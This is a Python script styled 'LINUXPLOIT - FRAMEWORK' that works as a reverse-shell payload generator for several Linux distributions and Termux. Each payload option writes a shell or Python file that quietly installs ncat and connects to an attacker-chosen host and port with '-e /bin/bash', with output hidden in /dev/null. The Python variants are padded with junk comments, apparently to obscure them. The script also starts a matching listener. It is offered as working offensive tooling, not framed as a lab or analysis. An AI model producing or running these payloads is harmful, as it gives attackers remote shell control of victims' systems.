import os
import click
import socket
print(""" 


 █████╗██████╗ 
██╔════╝██╔══██╗
█████╗  ██████╔╝
██╔══╝  ██╔══██╗
██║     ██║  ██║
╚═╝     ╚═╝  ╚═╝
            LINUXPLOIT - FRAMEWORK 
	       coded by: Febin Rev
""") 
print("""Available payload modules>>>
 
[1] linux_debian/reverse_tcp
[2] linux_arch/reverse_tcp
[3] linux_fedora/reverse_tcp
[4] linux_redhat/reverse_tcp
[5] linux_termux/reverse_tcp
[6] python/linux_debian/reverse_tcp
[7] python/linux_arch/reverse_tcp
[8] python/linux_fedora/reverse_tcp
[9] python/linux_redhat/reverse_tcp
[10] python/linux_termux/reverse_tcp

[L] febrev-listener
""")
lhost=click.prompt("frsf(lhost)#> ", type=str, default=socket.gethostbyname(socket.gethostname()))
print("LHOST ==> ",lhost)
lport=click.prompt("frsf(lport)#> ", type=str, default="6565")
print("LPORT ==> ",lport)
name=click.prompt("frsf(name)#> ", type=str, default="febrev")
print("PAYLOAD NAME ==> ",name)
output=click.prompt("frsf(output path)#> ", type=str, default=os.path.expanduser("~"))
print("PAYLOAD PATH ==> ",output)
payload=input("frsf(choose payload)# ")
if payload=="1":
	print(f"GENERATING PAYLOAD {output}/{name}.sh ")
	with open(f"{output}/{name}.sh","w+") as f:
		s=(f"""sudo apt-get install nmap -y > /dev/null
sudo apt-get install ncat -y > /dev/null
ncat {lhost} {lport} -e /bin/bash > /dev/null
		""")
		f.write(s)
		os.system(f"chmod +x {output}/{name}.sh ")
elif payload=="2":
	print("GENERATING PAYLOAD.......")
	with open(f"{output}/{name}.sh","w+") as f:
		s=(f"""sudo pacman -S install nmap -y > /dev/null
sudo pacman -S install ncat -y > /dev/null
ncat {lhost} {lport} -e /bin/bash > /dev/null
		""")
		f.write(s)
		os.system(f"chmod +x {output}/{name}.sh ")
elif payload=="3":
	print("GENERATING PAYLOAD.......")
	with open(f"{output}/{name}.sh","w+") as f:
		s=(f"""sudo dnf install nmap-ncat -y > /dev/null
ncat {lhost} {lport} -e /bin/bash > /dev/null
		""")
		f.write(s)
		os.system(f"chmod +x {output}/{name}.sh ")
elif payload=="4":
	print("GENERATING PAYLOAD.......")
	with open(f"{output}/{name}.sh","w+") as f:
		s=(f"""sudo yum install nmap-ncat -y > /dev/null
ncat {lhost} {lport} -e /bin/bash > /dev/null
		""")
		f.write(s)
		os.system(f"chmod +x {output}/{name}.sh ")
elif payload=="5":
	print("GENERATING PAYLOAD.......")
	with open(f"{output}/{name}.sh","w+") as f:
		s=(f"""apt-get install nmap -y > /dev/null
apt-get install ncat -y > /dev/null
ncat {lhost} {lport} -e /bin/bash > /dev/null
		""")
		f.write(s)
		os.system(f"chmod +x {output}/{name}.sh ")
elif payload=="6":
	print("GENERATING PAYLOAD......")
	pyload=(f"""import os
#jhsjkdhsjkghkjsghdkjahkjhgkdjghkjhsakjhdkjhkjhadksjhkjhdsjhj
#kjhgksjhakjhgkjhdkjhlsdjlakjsdhlkjlakjhsdllsjhlsdhjshdjhsdjhbkj
#kjkasjhkjhhugkjfoldll
os.system("sudo apt-get install nmap -y > /dev/null")
#lkjhlkjdghsjhgjkkdjkaslkslkjlas;aslk;llklskkdjkjsjh
#kjhbskjhgsajkdhjkshda
#lkjhkjhgjhsjhlkjglkhlkjhlkjhkjkljhksssssssssssss
os.system("sudo apt-get install ncat -y > /dev/null")
#jhkjhjkhgkjhgkjhgjdkjhfjld
os.system(f"ncat {lhost} {lport} -e /bin/bash > /dev/null")
#jakskjsdjhksdjkdskjdsjkdjjdsjkjhkjgkjfdhjkkfkjfdjfdjjfjfjjfj
	""")
	f=open(f"{output}/{name}.py","w+")
	f.write(pyload)
	f.close()
elif payload=="7":
	print("GENERATING PAYLOAD......")
	pyload=(f"""import os
#jhsjkdhsjkghkjsghdkjahkjhgkdjghkjhsakjhdkjhkjhadksjhkjhdsjhj
#kjhgksjhakjhgkjhdkjhlsdjlakjsdhlkjlakjhsdllsjhlsdhjshdjhsdjhbkj
#kjkasjhkjhhugkjfoldll
os.system("sudo pacman -S install nmap -y > /dev/null")
#lkjhlkjdghsjhgjkkdjkaslkslkjlas;aslk;llklskkdjkjsjh
#kjhbskjhgsajkdhjkshda
#lkjhkjhgjhsjhlkjglkhlkjhlkjhkjkljhksssssssssssss
os.system("sudo pacman -S install ncat -y > /dev/null")
#jhkjhjkhgkjhgkjhgjdkjhfjld
os.system(f"ncat {lhost} {lport} -e /bin/bash > /dev/null")
#jakskjsdjhksdjkdskjdsjkdjjdsjkjhkjgkjfdhjkkfkjfdjfdjjfjfjjfj
	""")
	f=open(f"{output}/{name}.py","w+")
	f.write(pyload)
	f.close()
elif payload=="8":
	print("GENERATING PAYLOAD......")
	pyload=(f"""import os
#jhsjkdhsjkghkjsghdkjahkjhgkdjghkjhsakjhdkjhkjhadksjhkjhdsjhj
#kjhgksjhakjhgkjhdkjhlsdjlakjsdhlkjlakjhsdllsjhlsdhjshdjhsdjhbkj
#kjkasjhkjhhugkjfoldll
os.system("sudo dnf install nmap-ncat -y > /dev/null")
#lkjhlkjdghsjhgjkkdjkaslkslkjlas;aslk;llklskkdjkjsjh
#kjhbskjhgsajkdhjkshda
#lkjhkjhgjhsjhlkjglkhlkjhlkjhkjkljhksssssssssssss
#jhkjhjkhgkjhgkjhgjdkjhfjld
os.system(f"ncat {lhost} {lport} -e /bin/bash > /dev/null")
#jakskjsdjhksdjkdskjdsjkdjjdsjkjhkjgkjfdhjkkfkjfdjfdjjfjfjjfj
	""")
	f=open(f"{output}/{name}.py","w+")
	f.write(pyload)
	f.close()
elif payload=="9":
	print("GENERATING PAYLOAD......")
	pyload=(f"""import os
#jhsjkdhsjkghkjsghdkjahkjhgkdjghkjhsakjhdkjhkjhadksjhkjhdsjhj
#kjhgksjhakjhgkjhdkjhlsdjlakjsdhlkjlakjhsdllsjhlsdhjshdjhsdjhbkj
#kjkasjhkjhhugkjfoldll
os.system("sudo yum install nmap-ncat -y > /dev/null")
#lkjhlkjdghsjhgjkkdjkaslkslkjlas;aslk;llklskkdjkjsjh
#kjhbskjhgsajkdhjkshda
#lkjhkjhgjhsjhlkjglkhlkjhlkjhkjkljhksssssssssssss
#jhkjhjkhgkjhgkjhgjdkjhfjld
os.system(f"ncat {lhost} {lport} -e /bin/bash > /dev/null")
#jakskjsdjhksdjkdskjdsjkdjjdsjkjhkjgkjfdhjkkfkjfdjfdjjfjfjjfj
	""")
	f=open(f"{output}/{name}.py","w+")
	f.write(pyload)
	f.close()

elif payload=="10":
	print("GENERATING PAYLOAD......")
	pyload=(f"""import os
#jhsjkdhsjkghkjsghdkjahkjhgkdjghkjhsakjhdkjhkjhadksjhkjhdsjhj
#kjhgksjhakjhgkjhdkjhlsdjlakjsdhlkjlakjhsdllsjhlsdhjshdjhsdjhbkj
#kjkasjhkjhhugkjfoldll
os.system("apt-get install nmap -y > /dev/null")
#lkjhlkjdghsjhgjkkdjkaslkslkjlas;aslk;llklskkdjkjsjh
#kjhbskjhgsajkdhjkshda
#lkjhkjhgjhsjhlkjglkhlkjhlkjhkjkljhksssssssssssss
os.system("apt-get install ncat -y > /dev/null")
#jhkjhjkhgkjhgkjhgjdkjhfjld
os.system(f"ncat {lhost} {lport} -e /bin/bash > /dev/null")
#jakskjsdjhksdjkdskjdsjkdjjdsjkjhkjgkjfdhjkkfkjfdjfdjjfjfjjfj
	""")
	f=open(f"{output}/{name}.py","w+")
	f.write(pyload)
	f.close()
elif payload=="L":
	print("""
███████╗██████╗ 
██╔════╝██╔══██╗
█████╗  ██████╔╝
██╔══╝  ██╔══██╗
██║     ██║  ██║
╚═╝     ╚═╝  ╚═╝
                LISTENER >>
	 """)
	print("CTRL-C to quit..")
	os.system(f"ncat -lvp {lport} ")
	print("EXITING.....BYE BYE...")
	exit()
else:
	print("NO MODULE SELECTED...>ABORTING......")
	exit()

listener=click.prompt("DO YOU WANT TO START THE LISTENER ? (default y)[Y/n]:", type=str, default="y")
if listener=="y":
	print("""
███████╗██████╗ 
██╔════╝██╔══██╗
█████╗  ██████╔╝
██╔══╝  ██╔══██╗
██║     ██║  ██║
╚═╝     ╚═╝  ╚═╝
                LISTENER >>
	 """)
	print("CTRL-C to quit..")
	os.system(f"ncat -lvp {lport} ")
	print("EXITING.....BYE BYE...")
	exit()
else:
	print("EXITING...")
	exit()

















